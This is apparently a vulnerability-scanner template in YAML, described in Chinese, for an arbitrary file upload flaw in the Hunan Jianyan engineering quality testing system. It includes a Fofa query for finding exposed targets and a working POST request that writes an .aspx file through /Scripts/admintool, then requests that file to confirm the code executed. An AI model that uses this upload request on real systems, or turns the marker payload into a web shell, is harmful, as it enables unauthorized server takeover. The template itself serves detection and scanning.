id: hunan-jianyan-admintool-fileupload

info:
  name: 湖南建研工程质量检测系统任意文件上传漏洞
  author: fgz
  severity: critical
  verified: true
  description: |-
    湖南建研工程质量检测系统是湖南建研信息技术股份有限公司研发的，实现了检验工作的数字化和网络化管理，基本实现检测数据的自动采集，确保检验数据的公正性、科学性和准确性。该系统/Scripts/admintool接口存在任意文件上传漏洞，攻击者可以利用该漏洞上传恶意后门文件。
    Fofa: body="/Content/Theme/Standard/webSite/login.css"
  reference:
    - https://mp.weixin.qq.com/s/n0sRptpGQSZz7Y0cS1od-Q
  tags: fileupload
  created: 2024/02/21

set:
  filename: randomLowercase(6)
  filecontent: randomLowercase(12)
rules:
  r0:
    request:
      method: POST
      path: /Scripts/admintool?type=updatefile
      body: |
        filePath={{filename}}.aspx&fileContent=<%Response.Write("{{filecontent}}")%>
    expression: response.status == 200 && response.body.bcontains(b'"code":0')
  r1:
    request:
      method: GET
      path: /Scripts/{{filename}}.aspx
    expression: response.status == 200 && response.body.bcontains(bytes(filecontent))
expression: r0() && r1()
